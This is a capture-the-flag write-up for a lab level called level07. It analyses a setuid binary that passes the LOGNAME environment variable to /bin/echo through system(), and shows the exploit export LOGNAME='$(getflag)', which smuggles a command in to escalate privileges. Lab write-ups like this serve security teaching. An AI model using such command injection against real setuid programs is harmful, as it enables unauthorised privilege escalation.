# Level07
## Step by step
### 1. Locate files in `level07` home directory
  ```bash
  > ls -la
  -rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07
  ```
---

### 2. Analyze the `level07` executable
Execute the binary:
  ```
  > ./level
  level07
  ```
Using the `strings` command to inspect the binary reveals some useful details
  ```
  > strings level07
  /lib/ld-linux.so.2
  zE&9qU
  __gmon_start__
  libc.so.6
  _IO_stdin_used
  setresgid
  asprintf
  getenv
  setresuid
  system
  getegid
  geteuid
  __libc_start_main
  GLIBC_2.0
  PTRh 
  UWVS
  [^_]
  LOGNAME
  /bin/echo %s 
  ;*2$"
  ```
The binary uses:
- `/bin/echo`
- The environment variable `LOGNAME`
- The `getenv` function to retrieve the value of `LOGNAME`

---

### 3. Exploit the `level07` executable
The environment contains the variable `LOGNAME=level07`. By modifying this variable to execute `getflag`, we can retrieve the flag.
  ```bash
  > export LOGNAME='$(getflag)'
  > ./level07
  Check flag.Here is your token : XXX
  ```
  
